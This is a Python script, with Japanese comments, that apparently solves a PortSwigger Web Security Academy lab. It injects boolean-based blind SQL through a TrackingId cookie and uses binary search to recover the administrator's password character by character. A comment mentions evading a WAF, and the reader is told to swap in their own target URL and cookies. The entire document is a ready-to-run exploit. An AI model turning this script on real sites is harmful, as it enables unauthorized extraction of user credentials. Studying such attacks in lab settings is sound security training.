import requests
import time

# ターゲットの環境に合わせてここを書き換えてください！
URL = "https://0ab20064049ecb65806144b100ff002e.web-security-academy.net/"
TRACKING_ID = "mmOUZRT0l4BrXYn6"
SESSION_ID = "HhEspVAg7osCnAaiPRqsSx72GjqnACVM"

# 探索する文字のリスト（小文字と数字を昇順に並べたもの）
CHARS = "0123456789abcdefghijklmnopqrstuvwxyz"
password = ""

print(" 二分探索でパスワードの抽出を開始します")

# 1文字目から20文字目までループ
for i in range(1, 21):
    low = 0
    high = len(CHARS) - 1
    
    # 二分探索のアルゴリズム
    while low <= high:
        mid = (low + high) // 2
        mid_char = CHARS[mid]
        
        # 1. まず「mid_charより大きいか（>）」をクエリで聞く
        payload_greater = f"{TRACKING_ID}' AND (SELECT SUBSTRING(password,{i},1) FROM users WHERE username='administrator') > '{mid_char}'-- -"
        cookies = {'TrackingId': payload_greater, 'session': SESSION_ID}
        
        # サーバーへの負荷とWAF回避のために少しだけ待機（環境に合わせて調整）
        time.sleep(0.1)
        
        response = requests.get(URL, cookies=cookies)
        
        if "Welcome back" in response.text:
            # Trueなら、正解の文字はmid_charよりもアルファベット順で後ろにある
            low = mid + 1
        else:
            # Falseなら、正解の文字はmid_charと同じか、それより前にある
            # 2. 次に「mid_charと完全に一致するか（=）」を聞く
            payload_equal = f"{TRACKING_ID}' AND (SELECT SUBSTRING(password,{i},1) FROM users WHERE username='administrator') = '{mid_char}'-- -"
            cookies_equal = {'TrackingId': payload_equal, 'session': SESSION_ID}
            
            time.sleep(0.1)
            res_equal = requests.get(URL, cookies=cookies_equal)
            
            if "Welcome back" in res_equal.text:
                # 一致したらその文字で確定！
                password += mid_char
                print(f"[*] {i}文字目を特定: {mid_char} (現在: {password})")
                break
            else:
                # 一致しなかったので、正解の文字はmid_charよりも前にある
                high = mid - 1

print(f"[+] 最終パスワード: {password}")